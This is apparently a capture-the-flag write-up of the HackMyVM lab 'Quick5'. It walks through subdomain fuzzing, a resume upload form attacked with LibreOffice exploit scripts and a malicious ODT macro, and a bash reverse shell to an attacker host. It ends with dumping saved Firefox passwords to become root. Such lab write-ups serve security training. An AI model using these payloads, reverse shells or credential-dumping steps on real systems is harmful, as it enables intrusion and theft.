# Quick5

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.108:22
Open 10.0.2.108:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.108
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 84:e8:9c:b0:23:44:41:29:ae:7d:0b:0f:fe:88:08:c0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAXA+fE0PK4edxeuUDeROgBSy8iNSJweHfek5Q2YvWUR/7GaXViJ5ZoBXrAIVSrtxypdLs/6W6TsX0Cjt3yJuss=
|   256 44:82:b7:78:47:02:7e:b4:40:c7:6b:fd:70:68:c1:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOTz3nuGBUqN+vpFeJx/0N67XQG7k82jdfsfTyzR200y
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

There's a domain, add it to DNS

![writeup.png](/assets/pentest/hackmyvm/quick5/writeup.png)

![writeup-1.png](/assets/pentest/hackmyvm/quick5/writeup-1.png)

### Subdomain Discovery

Fuzz for more subdomains
```bash
└─$ domain='quick.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -r -fs 51519
careers                 [Status: 200, Size: 13819, Words: 3681, Lines: 245, Duration: 47ms]
customer                [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 156ms]
www.careers             [Status: 200, Size: 13819, Words: 3681, Lines: 245, Duration: 86ms]
www.customer            [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 11ms]
employee                [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 130ms]
#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 0ms]
#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 492ms]
```

`customer` and `employee` domains seem to be down, but not `careers`

```bash
└─$ feroxbuster -u http://careers.quick.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET      258l     1005w    14035c http://careers.quick.hmv/security-engineer.html
200      GET      257l     1016w    14009c http://careers.quick.hmv/developer.html
200      GET        1l       38w     2302c http://careers.quick.hmv/lib/easing/easing.min.js
200      GET      256l      994w    13842c http://careers.quick.hmv/salesperson.html
200      GET      245l     1067w    13819c http://careers.quick.hmv/index.html
200      GET      110l      199w     2634c http://careers.quick.hmv/js/main.js
200      GET        7l      279w    42766c http://careers.quick.hmv/lib/owlcarousel/owl.carousel.min.js
200      GET        3l      148w     8156c http://careers.quick.hmv/lib/wow/wow.min.js
200      GET        7l      158w     9028c http://careers.quick.hmv/lib/waypoints/waypoints.min.js
200      GET       11l       56w     2406c http://careers.quick.hmv/lib/counterup/counterup.min.js
200      GET        7l     1022w    56879c http://careers.quick.hmv/lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js
200      GET        1l     1421w    32832c http://careers.quick.hmv/lib/tempusdominus/js/moment-timezone.min.js
200      GET        1l     6490w   326657c http://careers.quick.hmv/lib/tempusdominus/js/moment.min.js
```

[http://careers.quick.hmv/security-engineer.html](http://careers.quick.hmv/security-engineer.html) -> [http://careers.quick.hmv/apply.php](http://careers.quick.hmv/apply.php)

![writeup-2.png](/assets/pentest/hackmyvm/quick5/writeup-2.png)

### RCE

The upload form accepts either PDF or ODT format.
```bash
└─$ curl http://careers.quick.hmv/apply.php -s | htmlq 'form input'
<input id="fname" name="fname" required="" type="text">
<input id="lname" name="lname" required="" type="text">
<input accept=".odt,.pdf" id="motivation" name="motivation" required="" type="file">
<input accept=".odt,.pdf" id="resume" name="resume" required="" type="file">
<input name="submit" type="submit" value="Submit">
```

LibreOffice and ODT are known to be exploitable so I started searching for CVE right away

![writeup-3.png](/assets/pentest/hackmyvm/quick5/writeup-3.png)

We don't know the version, but since POC is available might as well try
- **[CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255)**

```bash
└─$ git clone https://github.com/elweth-sec/CVE-2023-2255.git
└─$ cd CVE-2023-2255
└─$ python3 CVE-2023-2255.py --cmd 'wget https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php' --output 'letmein.odt'
File letmein.odt has been created !
└─$ sleep 120
└─$ curl http://careers.quick.hmv/shell.php -is | head -1
HTTP/1.1 404 Not Found
```

Nothing

Another go:
- [LibreOffice Macro Code Execution](https://www.rapid7.com/db/modules/exploit/multi/fileformat/libreoffice_macro_exec)
- [Libreoffice (CVE-2018-16858) - Remote Code Execution via Macro/Event execution](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)
- [CVE-2018-16858-Python](https://github.com/Henryisnotavailable/CVE-2018-16858-Python)

```bash
└─$ git clone https://github.com/Henryisnotavailable/CVE-2018-16858-Python.git
└─$ cd CVE-2018-16858-Python
└─$ py main.py -c 'wget https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php' -t 'Hello Please Let Me In' -o evil.odt
[+] Generated payload and saved to evil.odt
[!] If you want odt format, convert it in libre-office by saving evil.fodt as an .odt file
```

Errr.. still nothing

### Macros

Next day I went through the hints and Macros came up, I tried few payloads and nothing. Looked at writeups, used the payloads and nothing. Turns out my VM got bricked somehow, reimporting and then submitting ODT with Macros worked... Amazing.

Create a new file with LibreOffice Writer, include a macro with your code.

Tools > Macros > Organize Macros > BASIC > Document > New

```bash
Sub Main
	Shell("wget http://10.0.2.15/shell.php")
End Sub
```

![writeup-4.png](/assets/pentest/hackmyvm/quick5/writeup-4.png)

Tools > Customize > Open Document > YourModule

![writeup-5.png](/assets/pentest/hackmyvm/quick5/writeup-5.png)

```bash
# Uplaod via web form

└─$ date
Sat Nov  8 01:20:08 PM EST 2025
---
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.108 - - [08/Nov/2025 13:21:55] "GET /shell.php HTTP/1.1" 200 -
```

The file is not found, most probably no permissions to write in pwd
```bash
└─$ curl 'http://careers.quick.hmv/shell.php' -is | head -1
HTTP/1.1 404 Not Found

└─$ curl 'http://quick.hmv/shell.php' -is | head -1
HTTP/1.1 404 Not Found
```

Update the code to use reverse shell code instead. 
```bash
Sub Main
	Shell("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'")
End Sub
```

```bash
└─$ penelope -p 4444
andrew@quick5:~/applicants$ id
uid=1000(andrew) gid=1000(andrew) groups=1000(andrew),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

### User.txt

```bash
andrew@quick5:~$ grep 'HMV{.*}' user.txt -o
HMV{f1a85c0f54de51d374e15a73a2d71cd6}
```

## Privilege Escalation

The simulated user interaction: 
```bash
andrew@quick5:~$ crontab -l | tail -1
* * * * * cd /home/andrew/applicants && file=$(ls -t | head -n 1) && soffice --nolockcheck --norestore -o "$file"
```

Since there's GUI, snap packages and Firefox installed we should probably target it.
```bash
andrew@quick5:~/snap/firefox/common/.mozilla/firefox$ ls -l
total 56
drwx------  3 andrew andrew  4096 Feb 20  2024 'Crash Reports'
-rw-rw-r--  1 andrew andrew 39607 Nov  8 18:44  firefox_decrypt.py
drwx------ 14 andrew andrew  4096 Feb 20  2024  ii990jpt.default
drwx------  2 andrew andrew  4096 Feb 20  2024 'Pending Pings'
-rw-rw-r--  1 andrew andrew   114 Feb 20  2024  profiles.ini

andrew@quick5:~/snap/firefox/common/.mozilla/firefox$ curl https://github.com/unode/firefox_decrypt/raw/refs/heads/main/firefox_decrypt.py -LOs
andrew@quick5:~/snap/firefox/common/.mozilla/firefox$ python3 firefox_decrypt.py $(pwd)

Website:   http://employee.quick.hmv
Username: 'andrew.speed@quick.hmv'
Password: 'SuperSecretPassword'

andrew@quick5:~/snap/firefox/common/.mozilla/firefox$ su -
Password: SuperSecretPassword
root@quick5:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@quick5:~# grep 'HMV{.*}' /root/root.txt -o
HMV{7b243f33c5eb851f1c73fb6d6b3a974a}
```